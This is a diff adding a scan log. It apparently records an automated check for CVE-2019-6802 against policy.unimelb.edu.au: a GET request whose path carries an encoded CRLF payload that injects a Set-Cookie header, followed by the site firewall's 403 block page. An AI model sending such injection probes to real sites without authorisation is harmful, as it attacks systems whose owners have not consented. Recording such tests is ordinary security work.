@@ -1,0 +1,25 @@
+[CVE-2019-6802] Dumped HTTP request for https://policy.unimelb.edu.au/%0D%0ASet-Cookie:crlfinjection=1;
+
+
+GET /%0d%0aSet-Cookie:crlfinjection=1; HTTP/1.1
+Host: policy.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[CVE-2019-6802] Dumped HTTP response https://policy.unimelb.edu.au/%0D%0ASet-Cookie:crlfinjection=1;
+
+HTTP/1.1 403 Forbidden
+Connection: close
+Content-Length: 830
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Set-Cookie: visid_incap_3131542=N0AYtAJhSNOOkQFI30iVODNyk2gAAAAAQUIPAAAAAAACF+TqHSPklIVp915caecp; expires=Thu, 06 Aug 2026 08:08:48 GMT; HttpOnly; path=/; Domain=.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_1540_3131542=1xkHH8ToyR5o92xVQi5fFTNyk2gAAAAACWaTqqJexOymJ7bUFgx4eA==; path=/; Domain=.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 3-1537394-0 0NNN RT(1754493491969 8) q(0 -1 -1 -1) r(0 -1) B15(3,901872,0) U24
+
+<html style="height:100%"><head><META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW"><meta name="format-detection" content="telephone=no"><meta name="viewport" content="initial-scale=1.0"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><script src="/isd-not-when-not-I-my-Lady-cornessent-in-yet-is-" async></script></head><body style="margin:0px;height:100%"><iframe id="main-iframe" src="/_Incapsula_Resource?CWUDNSAI=23&xinfo=3-1537394-0%200NNN%20RT%281754493491969%208%29%20q%280%20-1%20-1%20-1%29%20r%280%20-1%29%20B15%283%2c901872%2c0%29%20U24&incident_id=1540000460019864754-7507418250742659&edet=15&cinfo=03000000&rpinfo=0&mth=GET" frameborder=0 width="100%" height="100%" marginheight="0px" marginwidth="0px">Request unsuccessful. Incapsula incident ID: 1540000460019864754-7507418250742659</iframe></body></html>
